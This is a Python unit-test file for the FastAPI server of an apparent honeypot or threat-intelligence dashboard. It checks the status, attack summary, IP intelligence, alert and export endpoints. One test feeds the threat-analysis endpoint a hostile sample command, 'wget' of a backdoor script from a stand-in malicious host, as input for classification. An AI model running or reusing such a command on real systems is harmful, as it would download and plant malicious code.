#!/usr/bin/env python3
"""
Unit tests for API Server module
Tests the FastAPI endpoints and authentication
"""

import unittest
import sys
import os
from fastapi.testclient import TestClient
import tempfile
import json

# Add parent directory to path to import modules
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from api_server import app


class TestAPIServer(unittest.TestCase):
    """Test cases for API Server endpoints"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.client = TestClient(app)
        self.valid_token = "demo_token_12345"
        self.invalid_token = "invalid_token"
        
        # Headers for authenticated requests
        self.auth_headers = {"Authorization": f"Bearer {self.valid_token}"}
        self.invalid_auth_headers = {"Authorization": f"Bearer {self.invalid_token}"}
    
    def test_health_endpoint(self):
        """Test health check endpoint"""
        response = self.client.get("/health")
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        self.assertIn("status", data)
        self.assertEqual(data["status"], "healthy")
        self.assertIn("timestamp", data)
    
    def test_root_endpoint(self):
        """Test root endpoint returns dashboard"""
        response = self.client.get("/")
        
        self.assertEqual(response.status_code, 200)
        # Should return HTML content
        self.assertIn("text/html", response.headers.get("content-type", ""))
    
    def test_system_status_with_auth(self):
        """Test system status endpoint with valid authentication"""
        response = self.client.get("/api/status", headers=self.auth_headers)
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        # Check required fields
        required_fields = ["status", "uptime", "total_events", "active_sessions", 
                          "database_size", "last_update"]
        for field in required_fields:
            self.assertIn(field, data)
    
    def test_system_status_without_auth(self):
        """Test system status endpoint without authentication"""
        response = self.client.get("/api/status")
        
        self.assertEqual(response.status_code, 403)  # Should require authentication
    
    def test_system_status_invalid_auth(self):
        """Test system status endpoint with invalid authentication"""
        response = self.client.get("/api/status", headers=self.invalid_auth_headers)
        
        self.assertEqual(response.status_code, 401)  # Unauthorized
    
    def test_attack_summary(self):
        """Test attack summary endpoint"""
        response = self.client.get("/api/attacks/summary", headers=self.auth_headers)
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        # Check required fields
        required_fields = ["total_attacks", "unique_ips", "high_threat_events", 
                          "avg_threat_score", "top_attack_types", "timeline_data"]
        for field in required_fields:
            self.assertIn(field, data)
        
        # Check data types
        self.assertIsInstance(data["total_attacks"], int)
        self.assertIsInstance(data["unique_ips"], int)
        self.assertIsInstance(data["avg_threat_score"], (int, float))
        self.assertIsInstance(data["top_attack_types"], dict)
        self.assertIsInstance(data["timeline_data"], list)
    
    def test_threat_analysis(self):
        """Test threat analysis endpoint"""
        test_data = {
            "command": "wget http://malicious.com/backdoor.sh",
            "session_id": "test_session",
            "src_ip": "192.168.1.100"
        }
        
        response = self.client.post(
            "/api/threats/analyze",
            headers=self.auth_headers,
            params=test_data
        )
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        # Check response structure
        required_fields = ["prediction", "ip_intelligence", "automated_responses", "timestamp"]
        for field in required_fields:
            self.assertIn(field, data)
        
        # Check prediction structure
        prediction = data["prediction"]
        prediction_fields = ["threat_type", "confidence", "risk_score", "is_anomaly"]
        for field in prediction_fields:
            self.assertIn(field, prediction)
    
    def test_threat_predictions(self):
        """Test threat predictions endpoint"""
        response = self.client.get("/api/threats/predictions", headers=self.auth_headers)
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        self.assertIsInstance(data, list)
    
    def test_ip_intelligence(self):
        """Test IP intelligence endpoint"""
        test_ip = "192.168.1.100"
        response = self.client.get(f"/api/intelligence/ip/{test_ip}", headers=self.auth_headers)
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        # Check required fields
        required_fields = ["ip_address", "reputation_score", "threat_categories", 
                          "country", "asn", "threat_feeds"]
        for field in required_fields:
            self.assertIn(field, data)
        
        self.assertEqual(data["ip_address"], test_ip)
        self.assertIsInstance(data["reputation_score"], int)
        self.assertIsInstance(data["threat_categories"], list)
        self.assertIsInstance(data["threat_feeds"], list)
    
    def test_create_alert(self):
        """Test alert creation endpoint"""
        alert_data = {
            "alert_type": "high_threat_command",
            "src_ip": "192.168.1.100",
            "threat_level": 75,
            "description": "Test alert"
        }
        
        response = self.client.post(
            "/api/alerts",
            headers=self.auth_headers,
            json=alert_data
        )
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        # Check response structure
        required_fields = ["alert_id", "status", "timestamp"]
        for field in required_fields:
            self.assertIn(field, data)
        
        self.assertEqual(data["status"], "created")
    
    def test_get_alerts(self):
        """Test get alerts endpoint"""
        response = self.client.get("/api/alerts", headers=self.auth_headers)
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        self.assertIsInstance(data, list)
    
    def test_threat_landscape_report(self):
        """Test threat landscape report endpoint"""
        response = self.client.get("/api/reports/threat-landscape", headers=self.auth_headers)
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        # Check required sections
        required_sections = ["period", "executive_summary", "attack_vectors", 
                           "geographic_distribution", "trending_threats", "recommendations"]
        for section in required_sections:
            self.assertIn(section, data)
    
    def test_model_retrain(self):
        """Test model retraining endpoint"""
        response = self.client.post("/api/models/retrain", headers=self.auth_headers)
        
        self.assertEqual(response.status_code, 200)
        data = response.json()
        
        required_fields = ["status", "message", "timestamp"]
        for field in required_fields:
            self.assertIn(field, data)
        
        self.assertEqual(data["status"], "started")
    
    def test_data_export_json(self):
        """Test data export in JSON format"""
        response = self.client.get(
            "/api/export/data?format=json&days=7", 
            headers=self.auth_headers
        )
        
        self.assertEqual(response.status_code, 200)
        # Should return JSON data
        try:
            json.loads(response.content)
        except json.JSONDecodeError:
            self.fail("Response is not valid JSON")
    
    def test_data_export_invalid_format(self):
        """Test data export with invalid format"""
        response = self.client.get(
            "/api/export/data?format=xml", 
            headers=self.auth_headers
        )
        
        self.assertEqual(response.status_code, 400)  # Bad request


if __name__ == '__main__':
    # Run tests with verbose output
    unittest.main(verbosity=2)
